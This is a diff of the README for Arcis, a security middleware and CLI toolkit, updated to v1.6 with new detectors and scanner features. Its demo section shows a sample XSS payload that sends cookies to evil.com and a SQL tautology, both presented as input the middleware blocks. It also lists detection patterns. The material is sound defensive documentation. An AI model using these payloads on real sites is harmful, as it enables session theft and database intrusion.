@@ -1,9 +1,9 @@
 > [!NOTE]
-> **New: `arcis sca`: supply chain attack scanner. Detects compromised axios (npm) and litellm (PyPI) packages from the March 2026 supply chain attacks. [Learn more →](#cli-tools)**
+> **New in v1.6: Interactive REPL (`arcis` with no args), V32-V34 vectors (toolcall injection, deserialization markers, GraphQL alias bomb), and the first stateful primitive (`CorrelationWindow`). `arcis sca` ships with 100 curated supply chain advisories embedded (59 npm + 41 PyPI, including axios 2026 + litellm 2026 + colourama + event-stream + ua-parser-js + @solana/web3.js) plus a live OSV layer via `--osv`. [See the CLI section →](#arcis-cli)**
 
 <div align="center">
 
-<img src="./arcis.webp" alt="Arcis: Runtime Security Middleware for Web Apps" width="100%">
+<img src="./arcis-banner.png" alt="Arcis. Security middleware for modern web apps. One install. Three languages." width="100%">
 
 # Arcis: Security Middleware for Every Backend
 
@@ -18,9 +18,44 @@ Blocks XSS, SQL injection, SSRF, CSRF, prompt injection, bot traffic, and 20+ mo
 
 **Install once. Protect everything.**
 
+[Docs](https://gagancm.github.io/arcis/documentation/) · [Quickstart](https://gagancm.github.io/arcis/documentation/getting-started.html) · [Detectors](https://gagancm.github.io/arcis/documentation/detectors/) · [Threat DB](https://gagancm.github.io/arcis/documentation/threats-db.html) · [Release notes](https://gagancm.github.io/arcis/documentation/release-notes.html) · [Why Arcis](https://gagancm.github.io/arcis/documentation/why-arcis.html)
+
 ---
 
 </div>
+
+## 30-second demo
+
+A POST request arrives at `/api/comments` with this body:
+
+```json
+{
+  "author": "alice",
+  "body": "Great article! <script>document.location='https://evil.com/steal?cookie='+document.cookie</script>",
+  "rating": "5 OR 1=1 --"
+}
+```
+
+Without Arcis, the `<script>` runs in every viewer's browser and the SQL fragment hits your DB. With `app.use(arcis({ block: true }))`, the request never reaches your handler:
+
+```
+arcis.deny  vector=xss  rule=patterns.xss.script-tag  route=POST /api/comments  ip_hash=a91b...
+arcis.deny  vector=sql  rule=patterns.sql.boolean-tautology
+```
+
+Or, in sanitize mode (the default), your handler gets:
+
+```json
+{
+  "author": "alice",
+  "body": "Great article! ",
+  "rating": "5"
+}
+```
+
+The detection model runs on top of NFKC Unicode normalization + a multi-decode chain, so fullwidth `＜script＞`, URL-encoded `%3Cscript%3E`, and triple-encoded variants reach the detector as the same string. The same call returns the same result in Node, Python, and Go — enforced by [shared test vectors](https://github.com/Gagancm/arcis/blob/main/spec/TEST_VECTORS.json).
+
+---
 
 ## What is Arcis?
 
@@ -64,7 +99,11 @@ At the checkpoint, Arcis:
 - **First-party framework adapters (Go)**: Gin, Echo, chi, Fiber, plus a stdlib `net/http` helper.
 - **Context-aware output encoding**: `encodeForHtml()`, `encodeForJs()`, `encodeForUrl()`, `encodeForCss()`, `encodeForAttribute()` for safe rendering in every output context.
 - **Supply chain scanner**: `arcis sca` checks lockfiles, `node_modules`, and Python environments against a database of known compromised packages.
-- **Static analysis CLI**: `arcis scan` and `arcis audit` flag unsafe patterns (`eval()`, `pickle.loads()`, `innerHTML`, SQL concat, SSRF sinks, weak crypto) across 23 rules.
+- **Static analysis CLI**: `arcis scan` and `arcis audit` flag unsafe patterns (`eval()`, `pickle.loads()`, `innerHTML`, SQL concat, SSRF sinks, weak crypto) across 24 rules.
+- **Interactive REPL (v1.6)**: `arcis` with no args drops into a full-screen TUI ("Arcis Console") with a persistent welcome banner, scrollback, slash commands (`/help`, `/clear`, `/cwd`, `/export`, `/exit`), command history at `~/.arcis/history`, and F2 / Shift-F2 jump-to-finding navigation. Opt out with `ARCIS_NO_REPL=1` or in CI / piped contexts (auto-disabled).
+- **Tier 1 detection hardening (v1.6)**: NFKC Unicode normalization + multi-decode chain close the fullwidth and encoding-stack bypass classes across every detector. Mutation tester runs 142 case/encoding/Unicode variants against the corpus on every PR. Go SDK now loads `patterns.json` at runtime via `//go:embed` for cross-SDK parity.
+- **New v1.6 vectors**: V32 toolcall-injection patterns in `detectPromptInjection`. V33 modern deserialization markers (`detectDeserialization` — Python pickle, Java FastJSON `@type`, PHP `unserialize`, Ruby Marshal, .NET BinaryFormatter). V34 GraphQL alias bomb + fragment cycle (`max_aliases` + `block_fragment_cycles` options in `graphqlGuard`).
+- **Stateful per-IP correlation (v1.6)**: `CorrelationWindow` middleware tracks a 60s rolling window per IP with scanner / credential-stuffing / race-window detection. `protectLogin / protectSignup / protectApi` accept a `correlation: { window }` option to wire it through with one line.
 
 ## Threat Coverage
 
@@ -84,9 +123,12 @@ At the checkpoint, Arcis:
 | **Open Redirect** | Absolute URLs, `javascript:`, protocol-relative, backslash/control char bypass |
 | **CSRF** | Double-submit cookie, token generation and validation |
 | **Rate Limiting** | Per-IP, sliding window, token bucket, in-memory or Redis, `X-RateLimit-*` headers |
-| **Bot Detection** | 650 patterns sourced from a curated MIT corpus + supplementary entries, 7 categories (search engines, social, monitoring, AI crawlers, scrapers, automated tools, unknown), behavioral signals on missing browser headers. The corpus is also published standalone at [`getarcis/well-known-bots`](https://github.com/getarcis/well-known-bots). |
+| **Bot Detection** | 635 patterns sourced from a curated MIT corpus + supplementary entries, 7 categories (search engines, social, monitoring, AI crawlers, scrapers, automated tools, unknown), behavioral signals on missing browser headers. The corpus is also published standalone at [`getarcis/well-known-bots`](https://github.com/getarcis/well-known-bots). |
 | **MCP server (`@arcis/mcp`)** | Model Context Protocol server exposing `arcis_audit`, `arcis_sca`, `arcis_scan`, and `arcis_detect_prompt_injection` as tools that Cursor, Claude Code, and any MCP-aware agent can call. |
-| **Prompt Injection** | 28 signatures across HIGH/MEDIUM/LOW tiers: jailbreak frameworks, system-prompt extraction, fake `<system>` tags, conversation-replay forgeries, base64/ROT13 smuggling hints |
+| **Prompt Injection** | 28 signatures across HIGH/MEDIUM/LOW tiers: jailbreak frameworks, system-prompt extraction, fake `<system>` tags, conversation-replay forgeries, base64/ROT13 smuggling hints, plus 5 v1.6 agent toolcall patterns (`"tool_call"` / `"function_call"` markers, ANSI escapes, tool-name spoofing) |
+| **Modern Deserialization (v1.6)** | `detectDeserialization()` flags request bodies that look like Python pickle (`\x80\x04`), Java FastJSON (`"@type":`), PHP `unserialize` (`O:N:"Class":`), Ruby Marshal (`\x04\x08`), or .NET BinaryFormatter (`\x00\x01\x00\x00\x00`). Detection-only: caller refuses the request. |
+| **GraphQL Abuse** | `graphqlGuard` rejects oversize queries, deep selection sets, introspection in production, and (v1.6) alias bombs + fragment cycles via `max_aliases` and `block_fragment_cycles`. |
+| **Stateful correlation (v1.6)** | `CorrelationWindow` middleware tracks a 60s rolling window per IP. Detects active scanners (`distinct_vectors >= 3 AND requests >= 20`), credential stuffing (`>= 10 distinct usernames on /login in 60s`), and race-window probes (route-pair within 200ms). Pairs with `protectLogin / protectApi`. |
 | **LLM Token Budget** | Per-key sliding-window token cap with optional per-request size limit. Custom estimator hook for tiktoken or your own counter. `X-Token-Budget-*` headers on every response |
 | **Security Headers** | CSP, HSTS, X-Frame-Options, COOP, CORP, COEP, Origin-Agent-Cluster, X-DNS-Prefetch-Control (16 headers) |
 | **Error Leakage** | Stack traces, DB errors, connection strings, internal IPs scrubbed in production |
@@ -275,58 +317,100 @@ import { MemoryStore } from '@arcis/node/stores';
 
 ---
 
-## CLI Tools
+## Arcis CLI
 
-### Supply Chain Attack Scanner (`arcis sca`)
-
-Detects compromised packages from known supply chain attacks. Scans your project's lockfiles, `node_modules`, `requirements.txt`, and Python environments for malicious versions and backdoor artifacts.
+The CLI ships as a single static native-Rust binary, installed via npm:
 
 ```bash
-# Scan current project
-arcis sca
+npm install -g @arcis/cli
+arcis --version
+```
 
-# Scan a specific directory
-arcis sca /path/to/project
+One install, no Python required, works regardless of whether your app is Node, Python, or Go. Cold start is ~30-60ms (vs ~700ms for the legacy Python CLI). The threat database is embedded; the binary runs fully offline.
 
-# Also check globally installed packages and .pth backdoors
-arcis sca --system
+### Interactive Console (v1.6)
 
-# List all threats in the database with sources and references
+Running bare `arcis` in a TTY drops into a full-screen interactive console:
+
+```bash
+$ arcis
+```
+
+A persistent welcome banner sits at the top with the version, working directory, available adapters, and quick-start commands. Type `audit .`, `sca .`, `scan <url>`, or `/help`. Output streams into the scrollback in real time, and the prompt stays pinned at the bottom.
+
+| Surface | What it does |
+|---|---|
+| `audit .` / `sca .` / `scan <url>` | Run any scanner inline; output appended to the scrollback |
+| `PgUp` / `PgDn` | Scroll the scrollback by a page |
+| `F2` / `Shift-F2` | Jump to the next / previous finding (any line starting with `CRITICAL` / `HIGH` / `MEDIUM` / `LOW`) |
+| `↑` / `↓` | Walk through command history (persisted at `~/.arcis/history`, 200 entries) |
+| `/help` | Show the welcome banner again |
+| `/clear` | Wipe the scrollback (banner re-appears) |
+| `/cwd <path>` | Change working directory without leaving the console |
+| `/export [file]` | Save the current session to a markdown file |
+| `/exit` / `Ctrl-D` | Leave the console |
+| `Ctrl-C` | Cancel the running command (does not exit) |
+| `Esc` | Clear current input and snap back to the tail |
+
+ANSI color from subprocesses is preserved in the scrollback. Disable the auto-launch behavior with `ARCIS_NO_REPL=1` (the REPL is also auto-disabled under CI or when stdout is piped, so scripts keep getting one-shot output).
+
+### Static Analysis (`arcis audit`)
+
+```bash
+# Audit a project for unsafe code patterns
+arcis audit /path/to/project --language python --severity high
+
+# 24 rules covering eval/exec/pickle/yaml.load/innerHTML/document.write/
+# bypassSecurityTrust*/JWT-without-alg/SQL-string-concat/SSRF-sinks/weak-crypto.
+arcis audit . --verbose
+arcis audit . --fail-on high                     # exit 1 on any HIGH+ finding
+arcis audit . --json                             # machine-readable JSON
+arcis audit . --sarif                            # GitHub Code Scanning compatible
+arcis audit . --baseline ./.arcis-baseline.json  # ignore pre-existing findings
+```
+
+Supported languages: `python`, `javascript`, `typescript`.
+
+### Endpoint Probe (`arcis scan`)
+
+```bash
+# Probe a live HTTP endpoint for injection susceptibility
+arcis scan http://localhost:5000
+
+# 17 attack vectors fired with smart payload sequencing; flags any
+# unsafely-reflected response, weak header, missing CSRF, etc.
+arcis scan https://api.example.com --csrf-from /login --bearer "$TOKEN"
+arcis scan http://localhost:5000 --json --cancel-on first-finding
+```
+
+### Supply Chain Scanner (`arcis sca`)
+
+Detects compromised packages from known supply chain attacks. Scans lockfiles, `node_modules`, Python environments for malicious versions and backdoor artifacts.
+
+```bash
+# Match dependencies against the embedded threat database
+arcis sca .
+
+# Pull live OSV advisories on top of the embedded DB (24h cached)
+arcis sca . --osv
+
+# Include globally-installed pip packages + .pth backdoor sweep
+arcis sca . --system
+
+# Machine-readable / GitHub-compatible output
+arcis sca . --json
+arcis sca . --sarif
+
+# Inventory only — generate a CycloneDX SBOM
+arcis sca . --sbom
+
+# List every threat in the embedded DB with source advisory links
 arcis sca --list-threats
 ```
 
-**Currently detects:**
+Scans `package-lock.json` (v1 + v3), `yarn.lock`, `pnpm-lock.yaml`, `node_modules/`, `requirements.txt`, `Pipfile.lock`, `poetry.lock`, plus Python `site-packages` for `.pth` backdoors with `--system`. Detects 100+ curated supply chain advisories including the 2026 axios (`plain-crypto-js` RAT), litellm (credential harvester + persistent `.pth` backdoor), and colourama compromises. Exit code 1 if any malicious package is found, so it slots straight into CI.
 
-| Attack | Malicious Versions | Vector | Source |
-|--------|-------------------|--------|--------|
-| **axios (npm)**, March 2026 | 1.14.1, 0.30.4 | Trojanized dependency `plain-crypto-js` deploys a RAT via postinstall | [npm Security Advisory](https://github.com/axios/axios/security/advisories) |
-| **litellm (PyPI)**, March 2026 | 1.82.7, 1.82.8 | Credential harvester + persistent `.pth` backdoor that survives `pip uninstall` | [PyPI Security Advisory](https://github.com/BerriAI/litellm/security/advisories) |
-
-**What it checks:**
-- `package-lock.json` (v1 and v3), `yarn.lock`, `node_modules/` on disk
-- `requirements.txt`, `Pipfile.lock`, `poetry.lock`
-- Currently installed pip packages (`--system`)
-- Python `site-packages` for suspicious `.pth` backdoor files (`--system`)
-
-Exit code 1 if compromised (CI-friendly).
-
-**Offline by design.** No network calls, no telemetry, no external requests. The scanner reads your local files only. Every detection can be audited in [`arcis/data/threat-db.json`](packages/arcis-python/arcis/data/threat-db.json). New supply chain attacks are added as they're publicly disclosed, each with a source advisory link.
-
----
-
-### Vulnerability Scanner & Static Analysis
-
-```bash
-# Scan HTTP endpoints for injection vulnerabilities
-arcis scan http://localhost:5000
-
-# Static analysis audit (14 rules for unsafe code patterns)
-arcis audit /path/to/project --language python --severity high
-```
-
-Detects: `eval()`, `exec()`, `pickle.loads()`, `yaml.load()` without SafeLoader, `.innerHTML`, `document.write()`, `bypassSecurityTrust*()`, JWT without algorithm check, and more.
-
-Supported languages: `python`, `javascript`, `typescript`
+**Offline by default.** All checks read local files. `--osv` is the only flag that hits the network, and even then results are cached for 24h under `~/.arcis/osv-cache.json`. Every detection in the embedded DB can be audited in [`arcis-data/data/threat-db.json`](packages/arcis-rust/crates/arcis-data/data/threat-db.json) with a source advisory link.
 
 ---
 
@@ -424,10 +508,10 @@ All SDKs are tested against a shared set of test vectors (`TEST_VECTORS.json`) t
 
 | SDK | Tests | Framework | Status |
 |-----|-------|-----------|--------|
-| Node.js | 1,869 | vitest | All passing |
-| Python | 1,219 | pytest | All passing |
-| Go | 300+ | go test -race | All passing |
-| **Total** | **3,388+** | | |
+| Node.js | 2,116+ | vitest | All passing |
+| Python | 1,688+ | pytest | All passing |
+| Go | 483+ | go test -race | All passing |
+| **Total** | **4,287+** | | |
 
 ---
 
@@ -473,17 +557,27 @@ The script is stripped. The rest of the comment is saved normally.
 
 ## Roadmap
 
-### Completed (v1.0 through v1.5)
+### What's new in v1.6
+
+- **Interactive REPL** ("Arcis Console") with persistent welcome banner, scrollback, slash commands, history file at `~/.arcis/history`, F2 / Shift-F2 jump-to-finding, ANSI color preservation.
+- **Welcome screen V2**: rounded box layout with title in border, two-pane content, all three adapter languages (node + python + go) listed.
+- **Tier 1 detection hardening**: NFKC Unicode normalization + multi-decode chain across all 3 SDKs, mutation tester suite (142 case/encoding/Unicode variants), Oracle DBMS_* + `${IFS}` patterns added to the shared corpus, Go SDK now reads `patterns.json` at runtime via `//go:embed`.
+- **New vectors**: V32 toolcall-injection patterns, V33 modern deserialization markers (`detectDeserialization`), V34 GraphQL alias bomb + fragment cycle detection.
+- **Stateful primitive**: `CorrelationWindow` middleware (60s rolling per IP) with scanner / credential-stuffing / race-window detection. `protectLogin / protectSignup / protectApi` accept a `correlation` option to wire it through.
+
+### v1.0 through v1.5
 
 - 20+ security flaw coverage (runtime + detection)
 - 3 SDKs (Node.js, Python, Go) at full parity
-- **12 framework adapters**: Express, NestJS, SvelteKit, Astro, Nuxt, Bun + Hono (Node), FastAPI, Flask, Django (Python), Gin, Echo, net/http (Go)
+- **12 framework adapters**: Express, NestJS, SvelteKit, Astro, Nuxt, Bun + Hono (Node), FastAPI, Flask, Django, Litestar (Python), Gin, Echo, chi, Fiber, net/http (Go)
 - **635-pattern bot corpus** (was 80) with allow/deny categorization
 - **AI/LLM prompt-injection detection** across all 3 SDKs (28 signatures, 3 severity tiers)
 - **`tokenBudget` middleware** for per-key LLM token spend caps
 - 3 rate limiting algorithms (fixed, sliding, token bucket)
 - Redis store support
-- `arcis scan` + `arcis audit` + `arcis sca` CLI tools (native Rust, single binary via `npm install -g @arcis/cli`)
+- `arcis scan` + `arcis audit` + `arcis sca` CLI (native Rust, single binary via `npm install -g @arcis/cli`)
+- `arcis audit` machine output: `--json`, `--sarif`, `--baseline`, `--fail-on <level>`, `--verbose`
+- `arcis sca` enhancements: OSV layer (`--osv`, 24h cache), `--sbom` (CycloneDX), `--system` (global pip + `.pth` sweep), `--json`, `--sarif`
 - Runtime telemetry stream to a self-hosted control plane (opt-in)
 - Context-aware output encoding (HTML body, attributes, JS, CSS, URL)
 - COOP, CORP, COEP cross-origin isolation headers
@@ -492,7 +586,10 @@ The script is stripped. The rest of the comment is saved normally.
 - LDAP injection protection
 - SSTI and XXE sanitization across all 3 SDKs
 - Security bypass hardening (Unicode normalization, decimal/octal IP encoding, surrogate pairs)
-- ~3,388+ tests across 3 SDKs, published on npm + PyPI
+- Composite helpers: `protectLogin`, `protectSignup`, `protectApi`, `signup_protection`
+- Guards API for non-HTTP contexts (queues, agent tool handlers, gRPC)
+- `@arcis/mcp` server exposing audit/sca/scan/detect_prompt_injection as MCP tools
+- ~4,287+ tests across 3 SDKs, published on npm + PyPI
 
 ### Planned
 
